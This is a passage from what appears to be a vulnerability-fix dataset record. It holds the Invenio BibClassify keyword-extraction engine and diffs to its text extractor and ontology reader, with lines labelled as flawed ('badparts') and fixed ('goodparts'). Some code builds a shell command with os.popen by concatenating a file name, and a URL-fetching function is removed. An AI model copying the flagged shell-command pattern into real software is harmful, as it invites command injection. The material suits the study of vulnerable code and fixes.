\"\"\"Turn list of keywords into dictionary.\"\"\" r={} for k, v in keywords: r[k]=v return r def _sort_kw_matches(skw_matches, limit=0): \"\"\"Return a resized version of keywords to the given length.\"\"\" sorted_keywords=list(skw_matches.items()) sorted_keywords.sort(_skw_matches_comparator) return limit and sorted_keywords[:limit] or sorted_keywords def _get_partial_text(fulltext): \"\"\" Return a short version of the fulltext used with the partial matching mode. The version is composed of 20% in the beginning and 20% in the middle of the text.\"\"\" length=len(fulltext) get_index=lambda x: int(float(x) / 100 * length) partial_text=[fulltext[get_index(start):get_index(end)] for start, end in bconfig.CFG_BIBCLASSIFY_PARTIAL_TEXT] return \"\\n\".join(partial_text) def save_keywords(filename, xml): tmp_dir=os.path.dirname(filename) if not os.path.isdir(tmp_dir): os.mkdir(tmp_dir) file_desc=open(filename, \"w\") file_desc.write(xml) file_desc.close() def get_tmp_file(recid): tmp_directory=\"%s/bibclassify\" % bconfig.CFG_TMPDIR if not os.path.isdir(tmp_directory): os.mkdir(tmp_directory) filename=\"bibclassify_%s.xml\" % recid abs_path=os.path.join(tmp_directory, filename) return abs_path def _parse_marc_code(field): \"\"\"Parse marc field and return default indicators if not filled in.\"\"\" field=str(field) if len(field) < 4: raise Exception('Wrong field code: %s' % field) else: field +='__' tag=field[0:3] ind1=field[3].replace('_', '') ind2=field[4].replace('_', '') return tag, ind1, ind2 if __name__==\"__main__\": log.error(\"Please use bibclassify_cli from now on.\") ", "sourceWithComments": "# -*- coding: utf-8 -*-\n#\n# This file is part of Invenio.\n# Copyright (C) 2007, 2008, 2009, 2010, 2011, 2013, 2014 CERN.\n#\n# Invenio is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License as\n# published by the Free Software Foundation; either version 2 of the\n# License, or (at your option) any later version.\n#\n# Invenio is distributed in the hope that it will be useful, but\n# WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with Invenio; if not, write to the Free Software Foundation, Inc.,\n# 59 Temple Place, Suite 330, Boston, MA 02111-1307, USA.\n\"\"\"\nBibClassify engine.\n\nThis module is the main module of BibClassify. its two main methods are\noutput_keywords_for_sources and get_keywords_from_text. The first one output\nkeywords for a list of sources (local files or URLs, PDF or text) while the\nsecond one outputs the keywords for text lines (which are obtained using the\nmodule bibclassify_text_normalizer).\n\nThis module also takes care of the different outputs (text, MARCXML or HTML).\nBut unfortunately there is a confusion between running in a standalone mode\nand producing output suitable for printing, and running in a web-based\nmode where the webtemplate is used. For the moment the pieces of the representation\ncode are left in this module.\n\"\"\"\n\nfrom __future__ import print_function\n\nimport os\nfrom six import iteritems\nimport config as bconfig\n\nfrom invenio.legacy.bibclassify import ontology_reader as reader\nimport text_extractor as extractor\nimport text_normalizer as normalizer\nimport keyword_analyzer as keyworder\nimport acronym_analyzer as acronymer\n\nfrom invenio.utils.url import make_user_agent_string\nfrom invenio.utils.text import encode_for_xml\n\nlog = bconfig.get_logger(\"bibclassify.engine\")\n\n# ---------------------------------------------------------------------\n#                          API\n# ---------------------------------------------------------------------\n\n\ndef output_keywords_for_sources(input_sources, taxonomy_name, output_mode=\"text\",\n                                output_limit=bconfig.CFG_BIBCLASSIFY_DEFAULT_OUTPUT_NUMBER, spires=False,\n                                match_mode=\"full\", no_cache=False, with_author_keywords=False,\n                                rebuild_cache=False, only_core_tags=False, extract_acronyms=False,\n                                api=False, **kwargs):\n    \"\"\"Output the keywords for each source in sources.\"\"\"\n\n    # Inner function which does the job and it would be too much work to\n    # refactor the call (and it must be outside the loop, before it did\n    # not process multiple files)\n    def process_lines():\n        if output_mode == \"text\":\n            print(\"Input file: %s\" % source)\n\n        output = get_keywords_from_text(\n            text_lines,\n            taxonomy_name,\n            output_mode=output_mode,\n            output_limit=output_limit,\n            spires=spires,\n            match_mode=match_mode,\n            no_cache=no_cache,\n            with_author_keywords=with_author_keywords,\n            rebuild_cache=rebuild_cache,\n            only_core_tags=only_core_tags,\n            extract_acronyms=extract_acronyms\n        )\n        if api:\n            return output\n        else:\n            if isinstance(output, dict):\n                for i in output:\n                    print(output[i])\n\n    # Get the fulltext for each source.\n    for entry in input_sources:\n        log.info(\"Trying to read input file %s.\" % entry)\n        text_lines = None\n        source = \"\"\n        if os.path.isdir(entry):\n            for filename in os.listdir(entry):\n                if filename.startswith('.'):\n                    continue\n                filename = os.path.join(entry, filename)\n                if os.path.isfile(filename):\n                    text_lines = extractor.text_lines_from_local_file(filename)\n                    if text_lines:\n                        source = filename\n                        process_lines()\n        elif os.path.isfile(entry):\n            text_lines = extractor.text_lines_from_local_file(entry)\n            if text_lines:\n                source = os.path.basename(entry)\n                process_lines()\n        else:\n            # Treat as a URL.\n            text_lines = extractor.text_lines_from_url(entry,\n                                                       user_agent=make_user_agent_string(\"BibClassify\"))\n            if text_lines:\n                source = entry.split(\"/\")[-1]\n                process_lines()\n\n\ndef get_keywords_from_local_file(local_file, taxonomy_name, output_mode=\"text\",\n                                 output_limit=bconfig.CFG_BIBCLASSIFY_DEFAULT_OUTPUT_NUMBER, spires=False,\n                                 match_mode=\"full\", no_cache=False, with_author_keywords=False,\n                                 rebuild_cache=False, only_core_tags=False, extract_acronyms=False, api=False,\n                                 **kwargs):\n    \"\"\"Outputs keywords reading a local file. Arguments and output are the same\n    as for :see: get_keywords_from_text() \"\"\"\n\n    log.info(\"Analyzing keywords for local file %s.\" % local_file)\n    text_lines = extractor.text_lines_from_local_file(local_file)\n\n    return get_keywords_from_text(text_lines,\n                                  taxonomy_name,\n                                  output_mode=output_mode,\n                                  output_limit=output_limit,\n                                  spires=spires,\n                                  match_mode=match_mode,\n                                  no_cache=no_cache,\n                                  with_author_keywords=with_author_keywords,\n                                  rebuild_cache=rebuild_cache,\n                                  only_core_tags=only_core_tags,\n                                  extract_acronyms=extract_acronyms)\n\n\ndef get_keywords_from_text(text_lines, taxonomy_name, output_mode=\"text\",\n                           output_limit=bconfig.CFG_BIBCLASSIFY_DEFAULT_OUTPUT_NUMBER,\n                           spires=False, match_mode=\"full\", no_cache=False,\n                           with_author_keywords=False, rebuild_cache=False,\n                           only_core_tags=False, extract_acronyms=False,\n                           **kwargs):\n    \"\"\"Extract keywords from the list of strings\n\n    :param text_lines: list of strings (will be normalized before being\n        joined into one string)\n    :param taxonomy_name: string, name of the taxonomy_name\n    :param output_mode: string - text|html|marcxml|raw\n    :param output_limit: int\n    :param spires: boolean, if True marcxml output reflect spires codes.\n    :param match_mode: str - partial|full; in partial mode only\n        beginning of the fulltext is searched.\n    :param no_cache: boolean, means loaded definitions will not be saved.\n    :param with_author_keywords: boolean, extract keywords from the pdfs.\n    :param rebuild_cache: boolean\n    :param only_core_tags: boolean\n    :return: if output_mode=raw, it will return\n        (single_keywords, composite_keywords, author_keywords, acronyms)\n        for other output modes it returns formatted string\n    \"\"\"\n\n    cache = reader.get_cache(taxonomy_name)\n    if not cache:\n        reader.set_cache(taxonomy_name,\n                         reader.get_regular_expressions(taxonomy_name,\n                                                        rebuild=rebuild_cache,\n                                                        no_cache=no_cache))\n        cache = reader.get_cache(taxonomy_name)\n    _skw = cache[0]\n    _ckw = cache[1]\n    text_lines = normalizer.cut_references(text_lines)\n    fulltext = normalizer.normalize_fulltext(\"\\n\".join(text_lines))\n\n    if match_mode == \"partial\":\n        fulltext = _get_partial_text(fulltext)\n    author_keywords = None\n    if with_author_keywords:\n        author_keywords = extract_author_keywords(_skw, _ckw, fulltext)\n    acronyms = {}\n    if extract_acronyms:\n        acronyms = extract_abbreviations(fulltext)\n\n    single_keywords = extract_single_keywords(_skw, fulltext)\n    composite_keywords = extract_composite_keywords(_ckw, fulltext, single_keywords)\n\n    if only_core_tags:\n        single_keywords = clean_before_output(_filter_core_keywors(single_keywords))\n        composite_keywords = _filter_core_keywors(composite_keywords)\n    else:\n        # Filter out the \"nonstandalone\" keywords\n        single_keywords = clean_before_output(single_keywords)\n    return get_keywords_output(single_keywords, composite_keywords, taxonomy_name,\n                               author_keywords, acronyms, output_mode, output_limit,\n                               spires, only_core_tags)\n\n\ndef extract_single_keywords(skw_db, fulltext):\n    \"\"\"Find single keywords in the fulltext\n    :var skw_db: list of KeywordToken objects\n    :var fulltext: string, which will be searched\n    :return : dictionary of matches in a format {\n            <keyword object>, [[position, position...], ],\n            ..\n            }\n            or empty {}\n    \"\"\"\n    return keyworder.get_single_keywords(skw_db, fulltext) or {}\n\n\ndef extract_composite_keywords(ckw_db, fulltext, skw_spans):\n    \"\"\"Returns a list of composite keywords bound with the number of\n    occurrences found in the text string.\n    :var ckw_db: list of KewordToken objects (they are supposed to be composite ones)\n    :var fulltext: string to search in\n    :skw_spans: dictionary of already identified single keywords\n    :return : dictionary of matches in a format {\n            <keyword object>, [[position, position...], [info_about_matches] ],\n            ..\n            }\n            or empty {}\n    \"\"\"\n    return keyworder.get_composite_keywords(ckw_db, fulltext, skw_spans) or {}\n\n\ndef extract_abbreviations(fulltext):\n    \"\"\"Extract acronyms from the fulltext\n    :var fulltext: utf-8 string\n    :return: dictionary of matches in a formt {\n          <keyword object>, [matched skw or ckw object, ....]\n          }\n          or empty {}\n    \"\"\"\n    acronyms = {}\n    K = reader.KeywordToken\n    for k, v in acronymer.get_acronyms(fulltext).items():\n        acronyms[K(k, type='acronym')] = v\n    return acronyms\n\n\ndef extract_author_keywords(skw_db, ckw_db, fulltext):\n    \"\"\"Finds out human defined keyowrds in a text string. Searches for\n    the string \"Keywords:\" and its declinations and matches the\n    following words.\n\n    :var skw_db: list single kw object\n    :var ckw_db: list of composite kw objects\n    :var fulltext: utf-8 string\n    :return: dictionary of matches in a formt {\n          <keyword object>, [matched skw or ckw object, ....]\n          }\n          or empty {}\n    \"\"\"\n    akw = {}\n    K = reader.KeywordToken\n    for k, v in keyworder.get_author_keywords(skw_db, ckw_db, fulltext).items():\n        akw[K(k, type='author-kw')] = v\n    return akw\n\n\n# ---------------------------------------------------------------------\n#                          presentation functions\n# ---------------------------------------------------------------------\n\n\ndef get_keywords_output(single_keywords, composite_keywords, taxonomy_name,\n                        author_keywords=None, acronyms=None, style=\"text\", output_limit=0,\n                        spires=False, only_core_tags=False):\n    \"\"\"Returns a formatted string representing the keywords according\n    to the chosen style. This is the main routing call, this function will\n    also strip unwanted keywords before output and limits the number\n    of returned keywords\n    :var single_keywords: list of single keywords\n    :var composite_keywords: list of composite keywords\n    :var taxonomy_name: string, taxonomy name\n    :keyword author_keywords: dictionary of author keywords extracted from fulltext\n    :keyword acronyms: dictionary of extracted acronyms\n    :keyword style: text|html|marc\n    :keyword output_limit: int, number of maximum keywords printed (it applies\n            to single and composite keywords separately)\n    :keyword spires: boolen meaning spires output style\n    :keyword only_core_tags: boolean\n    \"\"\"\n    categories = {}\n    # sort the keywords, but don't limit them (that will be done later)\n    single_keywords_p = _sort_kw_matches(single_keywords)\n\n    composite_keywords_p = _sort_kw_matches(composite_keywords)\n\n    for w in single_keywords_p:\n        categories[w[0].concept] = w[0].type\n    for w in single_keywords_p:\n        categories[w[0].concept] = w[0].type\n\n    complete_output = _output_complete(single_keywords_p, composite_keywords_p,\n                                       author_keywords, acronyms, spires,\n                                       only_core_tags, limit=output_limit)\n    functions = {\"text\": _output_text, \"marcxml\": _output_marc, \"html\":\n                 _output_html, \"dict\": _output_dict}\n    my_styles = {}\n\n    for s in style:\n        if s != \"raw\":\n            my_styles[s] = functions[s](complete_output, categories)\n        else:\n            if output_limit > 0:\n                my_styles[\"raw\"] = (_kw(_sort_kw_matches(single_keywords, output_limit)),\n                                    _kw(_sort_kw_matches(composite_keywords, output_limit)),\n                                    author_keywords,  # this we don't limit (?)\n                                    _kw(_sort_kw_matches(acronyms, output_limit)))\n            else:\n                my_styles[\"raw\"] = (single_keywords_p, composite_keywords_p, author_keywords, acronyms)\n\n    return my_styles\n\n\ndef build_marc(recid, single_keywords, composite_keywords,\n               spires=False, author_keywords=None, acronyms=None):\n    \"\"\"Create xml record.\n\n    :var recid: ingeter\n    :var single_keywords: dictionary of kws\n    :var composite_keywords: dictionary of kws\n    :keyword spires: please don't use, left for historical\n        reasons\n    :keyword author_keywords: dictionary of extracted keywords\n    :keyword acronyms: dictionary of extracted acronyms\n    :return: str, marxml\n    \"\"\"\n    output = ['<collection><record>\\n'\n              '<controlfield tag=\"001\">%s</controlfield>' % recid]\n\n    # no need to sort\n    single_keywords = single_keywords.items()\n    composite_keywords = composite_keywords.items()\n\n    output.append(_output_marc(single_keywords, composite_keywords, author_keywords, acronyms))\n\n    output.append('</record></collection>')\n\n    return '\\n'.join(output)\n\n\ndef _output_marc(output_complete, categories, kw_field=bconfig.CFG_MAIN_FIELD,\n                 auth_field=bconfig.CFG_AUTH_FIELD, acro_field=bconfig.CFG_ACRON_FIELD,\n                 provenience='BibClassify'):\n    \"\"\"Output the keywords in the MARCXML format.\n\n    :var skw_matches: list of single keywords\n    :var ckw_matches: list of composite keywords\n    :var author_keywords: dictionary of extracted author keywords\n    :var acronyms: dictionary of acronyms\n    :var spires: boolean, True=generate spires output - BUT NOTE: it is\n            here only not to break compatibility, in fact spires output\n            should never be used for xml because if we read marc back\n            into the KeywordToken objects, we would not find them\n    :keyword provenience: string that identifies source (authority) that\n        assigned the contents of the field\n    :return: string, formatted MARC\"\"\"\n\n    kw_template = ('<datafield tag=\"%s\" ind1=\"%s\" ind2=\"%s\">\\n'\n                   '    <subfield code=\"2\">%s</subfield>\\n'\n                   '    <subfield code=\"a\">%s</subfield>\\n'\n                   '    <subfield code=\"n\">%s</subfield>\\n'\n                   '    <subfield code=\"9\">%s</subfield>\\n'\n                   '</datafield>\\n')\n\n    output = []\n\n    tag, ind1, ind2 = _parse_marc_code(kw_field)\n    for keywords in (output_complete[\"Single keywords\"], output_complete[\"Core keywords\"]):\n        for kw in keywords:\n            output.append(kw_template % (tag, ind1, ind2, encode_for_xml(provenience),\n                                         encode_for_xml(kw), keywords[kw],\n                                         encode_for_xml(categories[kw])))\n\n    for field, keywords in ((auth_field, output_complete[\"Author keywords\"]),\n                            (acro_field, output_complete[\"Acronyms\"])):\n        if keywords and len(keywords) and field:  # field='' we shall not save the keywords\n            tag, ind1, ind2 = _parse_marc_code(field)\n            for kw, info in keywords.items():\n                output.append(kw_template % (tag, ind1, ind2, encode_for_xml(provenience),\n                                             encode_for_xml(kw), '', encode_for_xml(categories[kw])))\n\n    return \"\".join(output)\n\n\ndef _output_complete(skw_matches=None, ckw_matches=None, author_keywords=None,\n                     acronyms=None, spires=False, only_core_tags=False,\n                     limit=bconfig.CFG_BIBCLASSIFY_DEFAULT_OUTPUT_NUMBER):\n\n    if limit:\n        resized_skw = skw_matches[0:limit]\n        resized_ckw = ckw_matches[0:limit]\n    else:\n        resized_skw = skw_matches\n        resized_ckw = ckw_matches\n\n    results = {\"Core keywords\": _get_core_keywords(skw_matches, ckw_matches, spires=spires)}\n\n    if not only_core_tags:\n        results[\"Author keywords\"] = _get_author_keywords(author_keywords, spires=spires)\n        results[\"Composite keywords\"] = _get_compositekws(resized_ckw, spires=spires)\n        results[\"Single keywords\"] = _get_singlekws(resized_skw, spires=spires)\n        results[\"Field codes\"] = _get_fieldcodes(resized_skw, resized_ckw, spires=spires)\n        results[\"Acronyms\"] = _get_acronyms(acronyms)\n\n    return results\n\n\ndef _output_dict(complete_output, categories):\n    return {\n        \"complete_output\": complete_output,\n        \"categories\": categories\n    }\n\n\ndef _output_text(complete_output, categories):\n    \"\"\"Output the results obtained in text format.\n\n\n    :return: str, html formatted output\n    \"\"\"\n    output = \"\"\n\n    for result in complete_output:\n        list_result = complete_output[result]\n        if list_result:\n            list_result_sorted = sorted(list_result, key=lambda x: list_result[x],\n                                        reverse=True)\n            output += \"\\n\\n{0}:\\n\".format(result)\n            for element in list_result_sorted:\n                output += \"\\n{0} {1}\".format(list_result[element], element)\n\n    output += \"\\n--\\n{0}\".format(_signature())\n\n    return output\n\n\ndef _output_html(complete_output, categories):\n    \"\"\"Output the same as txt output does, but HTML formatted.\n\n    :var skw_matches: sorted list of single keywords\n    :var ckw_matches: sorted list of composite keywords\n    :var author_keywords: dictionary of extracted author keywords\n    :var acronyms: dictionary of acronyms\n    :var spires: boolean\n    :var only_core_tags: boolean\n    :keyword limit: int, number of printed keywords\n    :return: str, html formatted output\n    \"\"\"\n    return \"\"\"<html>\n    <head>\n      <title>Automatically generated keywords by bibclassify</title>\n    </head>\n    <body>\n    {0}\n    </body>\n    </html>\"\"\".format(\n        _output_text(complete_output).replace('\\n', '<br>')\n    ).replace('\\n', '')\n\n\ndef _get_singlekws(skw_matches, spires=False):\n    \"\"\"\n    :var skw_matches: dict of {keyword: [info,...]}\n    :keyword spires: bool, to get the spires output\n    :return: list of formatted keywords\n    \"\"\"\n    output = {}\n    for single_keyword, info in skw_matches:\n        output[single_keyword.output(spires)] = len(info[0])\n    return output\n\n\ndef _get_compositekws(ckw_matches, spires=False):\n    \"\"\"\n    :var ckw_matches: dict of {keyword: [info,...]}\n    :keyword spires: bool, to get the spires output\n    :return: list of formatted keywords\n    \"\"\"\n    output = {}\n    for composite_keyword, info in ckw_matches:\n        output[composite_keyword.output(spires)] = {\"numbers\": len(info[0]),\n                                                    \"details\": info[1]}\n    return output\n\n\ndef _get_acronyms(acronyms):\n    \"\"\"Return a formatted list of acronyms.\"\"\"\n    acronyms_str = {}\n    if acronyms:\n        for acronym, expansions in iteritems(acronyms):\n            expansions_str = \", \".join([\"%s (%d)\" % expansion\n                                        for expansion in expansions])\n            acronyms_str[acronym] = expansions_str\n\n    return acronyms\n\n\ndef _get_author_keywords(author_keywords, spires=False):\n    \"\"\"Format the output for the author keywords.\n\n    :return: list of formatted author keywors\n    \"\"\"\n    out = {}\n    if author_keywords:\n        for keyword, matches in author_keywords.items():\n            skw_matches = matches[0]  # dictionary of single keywords\n            ckw_matches = matches[1]  # dict of composite keywords\n            matches_str = []\n            for ckw, spans in ckw_matches.items():\n                matches_str.append(ckw.output(spires))\n            for skw, spans in skw_matches.items():\n                matches_str.append(skw.output(spires))\n            if matches_str:\n                out[keyword] = matches_str\n            else:\n                out[keyword] = 0\n\n    return out\n\n\ndef _get_fieldcodes(skw_matches, ckw_matches, spires=False):\n    \"\"\"Return the output for the field codes.\n\n    :var skw_matches: dict of {keyword: [info,...]}\n    :var ckw_matches: dict of {keyword: [info,...]}\n    :keyword spires: bool, to get the spires output\n    :return: string\"\"\"\n    fieldcodes = {}\n    output = {}\n\n    for skw, _ in skw_matches:\n        for fieldcode in skw.fieldcodes:\n            fieldcodes.setdefault(fieldcode, set()).add(skw.output(spires))\n    for ckw, _ in ckw_matches:\n\n        if len(ckw.fieldcodes):\n            for fieldcode in ckw.fieldcodes:\n                fieldcodes.setdefault(fieldcode, set()).add(ckw.output(spires))\n        else:  # inherit field-codes from the composites\n            for kw in ckw.getComponents():\n                for fieldcode in kw.fieldcodes:\n                    fieldcodes.setdefault(fieldcode, set()).add('%s*' % ckw.output(spires))\n                    fieldcodes.setdefault('*', set()).add(kw.output(spires))\n\n    for fieldcode, keywords in fieldcodes.items():\n        output[fieldcode] = ', '.join(keywords)\n\n    return output\n\n\ndef _get_core_keywords(skw_matches, ckw_matches, spires=False):\n    \"\"\"Return the output for the field codes.\n\n    :var skw_matches: dict of {keyword: [info,...]}\n    :var ckw_matches: dict of {keyword: [info,...]}\n    :keyword spires: bool, to get the spires output\n    :return: set of formatted core keywords\n    \"\"\"\n    output = {}\n    category = {}\n\n    def _get_value_kw(kw):\n        \"\"\"Help to sort the Core keywords.\"\"\"\n        i = 0\n        while kw[i].isdigit():\n            i += 1\n        if i > 0:\n            return int(kw[:i])\n        else:\n            return 0\n\n    for skw, info in skw_matches:\n        if skw.core:\n            output[skw.output(spires)] = len(info[0])\n            category[skw.output(spires)] = skw.type\n    for ckw, info in ckw_matches:\n        if ckw.core:\n            output[ckw.output(spires)] = len(info[0])\n        else:\n            #test if one of the components is  not core\n            i = 0\n            for c in ckw.getComponents():\n                if c.core:\n                    output[c.output(spires)] = info[1][i]\n                i += 1\n    return output\n\n\ndef _filter_core_keywors(keywords):\n    matches = {}\n    for kw, info in keywords.items():\n        if kw.core:\n            matches[kw] = info\n    return matches\n\n\ndef _signature():\n    \"\"\"Print out the bibclassify signature.\n\n    #todo: add information about taxonomy, rdflib\"\"\"\n\n    return 'bibclassify v%s' % (bconfig.VERSION,)\n\n\ndef clean_before_output(kw_matches):\n    \"\"\"Return a clean copy of the keywords data structure.\n\n    Stripped off the standalone and other unwanted elements\"\"\"\n    filtered_kw_matches = {}\n\n    for kw_match, info in iteritems(kw_matches):\n        if not kw_match.nostandalone:\n            filtered_kw_matches[kw_match] = info\n\n    return filtered_kw_matches\n\n# ---------------------------------------------------------------------\n#                          helper functions\n# ---------------------------------------------------------------------\n\n\ndef _skw_matches_comparator(kw0, kw1):\n    \"\"\"\n    Compare 2 single keywords objects.\n\n    First by the number of their spans (ie. how many times they were found),\n    if it is equal it compares them by lenghts of their labels.\n    \"\"\"\n    list_comparison = cmp(len(kw1[1][0]), len(kw0[1][0]))\n    if list_comparison:\n        return list_comparison\n\n    if kw0[0].isComposite() and kw1[0].isComposite():\n        component_avg0 = sum(kw0[1][1]) / len(kw0[1][1])\n        component_avg1 = sum(kw1[1][1]) / len(kw1[1][1])\n        component_comparison = cmp(component_avg1, component_avg0)\n        if component_comparison:\n            return component_comparison\n\n    return cmp(len(str(kw1[0])), len(str(kw0[0])))\n\n\ndef _kw(keywords):\n    \"\"\"Turn list of keywords into dictionary.\"\"\"\n    r = {}\n    for k, v in keywords:\n        r[k] = v\n    return r\n\n\ndef _sort_kw_matches(skw_matches, limit=0):\n    \"\"\"Return a resized version of keywords to the given length.\"\"\"\n    sorted_keywords = list(skw_matches.items())\n    sorted_keywords.sort(_skw_matches_comparator)\n    return limit and sorted_keywords[:limit] or sorted_keywords\n\n\ndef _get_partial_text(fulltext):\n    \"\"\"\n    Return a short version of the fulltext used with the partial matching mode.\n\n    The version is composed of 20% in the beginning and 20% in the middle of the\n    text.\"\"\"\n    length = len(fulltext)\n\n    get_index = lambda x: int(float(x) / 100 * length)\n\n    partial_text = [fulltext[get_index(start):get_index(end)]\n                    for start, end in bconfig.CFG_BIBCLASSIFY_PARTIAL_TEXT]\n\n    return \"\\n\".join(partial_text)\n\n\ndef save_keywords(filename, xml):\n    tmp_dir = os.path.dirname(filename)\n    if not os.path.isdir(tmp_dir):\n        os.mkdir(tmp_dir)\n\n    file_desc = open(filename, \"w\")\n    file_desc.write(xml)\n    file_desc.close()\n\n\ndef get_tmp_file(recid):\n    tmp_directory = \"%s/bibclassify\" % bconfig.CFG_TMPDIR\n    if not os.path.isdir(tmp_directory):\n        os.mkdir(tmp_directory)\n    filename = \"bibclassify_%s.xml\" % recid\n    abs_path = os.path.join(tmp_directory, filename)\n    return abs_path\n\n\ndef _parse_marc_code(field):\n    \"\"\"Parse marc field and return default indicators if not filled in.\"\"\"\n    field = str(field)\n    if len(field) < 4:\n        raise Exception('Wrong field code: %s' % field)\n    else:\n        field += '__'\n    tag = field[0:3]\n    ind1 = field[3].replace('_', '')\n    ind2 = field[4].replace('_', '')\n    return tag, ind1, ind2\n\n\nif __name__ == \"__main__\":\n    log.error(\"Please use bibclassify_cli from now on.\")\n"}, "/invenio/legacy/bibclassify/ontology_reader.py": {"changes": [{"diff": "\n                 for label in self.compositeof:\n                     _get_ckw_components(new_vals, label)\n                 self.compositeof = new_vals\n-            except TaxonomyError:\n+            except TaxonomyError as err:\n                 # the composites will be empty\n                 # (better than to have confusing, partial matches)\n                 self.compositeof = []\n-                log.error(\n-                    'We reset this composite keyword, so that it does not match anything. Please fix the taxonomy.')\n+                log.error(err)\n \n     def isComposite(self):\n         \"\"\"Return value of _composite.\"\"", "add": 2, "remove": 3, "filename": "/invenio/legacy/bibclassify/ontology_reader.py", "badparts": ["            except TaxonomyError:", "                log.error(", "                    'We reset this composite keyword, so that it does not match anything. Please fix the taxonomy.')"], "goodparts": ["            except TaxonomyError as err:", "                log.error(err)"]}]}, "/invenio/legacy/bibclassify/text_extractor.py": {"changes": [{"diff": "\n # 59 Temple Place, Suite 330, Boston, MA 02111-1307, USA.\n \n-\"\"\"\n-BibClassify text extractor.\n+\"\"\"BibClassify text extractor.\n \n This module provides method to extract the fulltext from local or remote\n documents. Currently 2 formats of documents are supported: PDF and text\n", "add": 1, "remove": 2, "filename": "/invenio/legacy/bibclassify/text_extractor.py", "badparts": ["\"\"\"", "BibClassify text extractor."], "goodparts": ["\"\"\"BibClassify text extractor."]}, {"diff": "\n import os\n import re\n-import tempfile\n-import urllib2\n+\n from invenio.legacy.bibclassify import config as bconfig\n \n if bconfig.STANDALONE:\n", "add": 1, "remove": 2, "filename": "/invenio/legacy/bibclassify/text_extractor.py", "badparts": ["import tempfile", "import urllib2"], "goodparts": []}, {"diff": "\n \n def is_pdf(document):\n-    \"\"\"Checks if a document is a PDF file. Returns True if is is.\"\"\"\n+    \"\"\"Check if a document is a PDF file and returns True if is is.\"\"\"\n     if not executable_exists('pdftotext'):\n         log.warning(\"GNU file was not found on the system. \"\n                     \"Switching to a weak file extension test.\")\n", "add": 1, "remove": 1, "filename": "/invenio/legacy/bibclassify/text_extractor.py", "badparts": ["    \"\"\"Checks if a document is a PDF file. Returns True if is is.\"\"\""], "goodparts": ["    \"\"\"Check if a document is a PDF file and returns True if is is.\"\"\""]}, {"diff": "\n     # version 4.10.\n     file_output = os.popen('file ' + re.escape(document)).read()\n     try:\n-        filetype = file_output.split(\":\")[1]\n+        filetype = file_output.split(\":\")[-1]\n     except IndexError:\n         log.error(\"Your version of the 'file' utility seems to \"\n-                  \"be unsupported. Please report this to cds.support@cern.ch.\")\n+                  \"be unsupported.\")\n         raise Exception('Incompatible pdftotext')\n \n     pdf = filetype.find(\"PDF\") > -1\n     # This is how it should be done however this is incompatible with\n     # file version 4.10.\n-    #os.popen('file -bi ' + document).read().find(\"application/pdf\")\n+    # os.popen('file -bi ' + document).read().find(\"application/pdf\")\n     return pdf\n \n \n def text_lines_from_local_file(document, remote=False):\n-    \"\"\"Returns the fulltext of the local file.\n+    \"\"\"Return the fulltext of the local file.\n+\n     @var document: fullpath to the file that should be read\n     @var remote: boolean, if True does not count lines (gosh!)\n     @return: list of lines if st was read or an empty list\"\"\"\n-\n     try:\n         if is_pdf(document):\n             if not executable_exists(\"pdftotext\"):\n", "add": 5, "remove": 5, "filename": "/invenio/legacy/bibclassify/text_extractor.py", "badparts": ["        filetype = file_output.split(\":\")[1]", "                  \"be unsupported. Please report this to cds.support@cern.ch.\")", "    \"\"\"Returns the fulltext of the local file."], "goodparts": ["        filetype = file_output.split(\":\")[-1]", "                  \"be unsupported.\")", "    \"\"\"Return the fulltext of the local file."]}, {"diff": "\n     lines = [line.decode(\"utf-8\", 'replace') for line in filestream]\n     filestream.close()\n \n-    if not _is_english_text('\\n'.join(lines)):\n-        log.warning(\"It seems the file '%s' is unvalid and doesn't \"\n-                    \"contain text. Please communicate this file to the Invenio \"\n-                    \"team.\" % document)\n-\n-    line_nb = len(lines)\n-    word_nb = 0\n-    for line in lines:\n-        word_nb += len(re.findall(\"\\S+\", line))\n-\n     # Discard lines that do not contain at least one word.\n-    lines = [line for line in lines if _ONE_WORD.search(line) is not None]\n-\n-    if not remote:\n-        log.info(\"Local file has %d lines and %d words.\" % (line_nb, word_nb))\n-\n-    return lines\n-\n-\n-def _is_english_text(text):\n-    \"\"\"\n-    Checks if a text is correct english.\n-    Computes the number of words in the text and compares it to the\n-    expected number of words (based on an average size of words of 5.1\n-    letters).\n-\n-    @param text_lines: the text to analyze\n-    @type text_lines:  string\n-    @return:           True if the text is English, False otherwise\n-    @rtype:            Boolean\n-    \"\"\"\n-    # Consider one word and one space.\n-    avg_word_length = 2.55 + 1\n-    expected_word_number = float(len(text)) / avg_word_length\n-\n-    words = [word\n-             for word in re.split('\\W', text)\n-             if word.isalpha()]\n-\n-    word_number = len(words)\n-\n-    return word_number > expected_word_number\n-\n-\n-def text_lines_from_url(url, user_agent=\"\"):\n-    \"\"\"Returns the fulltext of the file found at the URL.\"\"\"\n-    request = urllib2.Request(url)\n-    if user_agent:\n-        request.add_header(\"User-Agent\", user_agent)\n-    try:\n-        distant_stream = urlopen(request)\n-        # Write the URL content to a temporary file.\n-        local_file = tempfile.mkstemp(prefix=\"bibclassify.\")[1]\n-        local_stream = open(local_file, \"w\")\n-        local_stream.write(distant_stream.read())\n-        local_stream.close()\n-    except:\n-        log.error(\"Unable to read from URL %s.\" % url)\n-        return None\n-    else:\n-        # Read lines from the temporary file.\n-        lines = text_lines_from_local_file(local_file, remote=True)\n-        os.remove(local_file)\n-\n-        line_nb = len(lines)\n-        word_nb = 0\n-        for line in lines:\n-            word_nb += len(re.findall(\"\\S+\", line))\n-\n-        log.info(\"Remote file has %d lines and %d words.\" % (line_nb, word_nb))\n-\n-        return lines\n+    return [line for line in lines if _ONE_WORD.search(line) is not None]\n \n \n def executable_exists(executable):\n-    \"\"\"Tests if an executable is available on the system.\"\"\"\n+    \"\"\"Test if an executable is available on the system.\"\"\"\n     for directory in os.getenv(\"PATH\").split(\":\"):\n         if os.path.exists(os.path.join(directory, executable)):\n             return True\n     return False\n-\n-\n", "add": 2, "remove": 74, "filename": "/invenio/legacy/bibclassify/text_extractor.py", "badparts": ["    if not _is_english_text('\\n'.join(lines)):", "        log.warning(\"It seems the file '%s' is unvalid and doesn't \"", "                    \"contain text. Please communicate this file to the Invenio \"", "                    \"team.\" % document)", "    line_nb = len(lines)", "    word_nb = 0", "    for line in lines:", "        word_nb += len(re.findall(\"\\S+\", line))", "    lines = [line for line in lines if 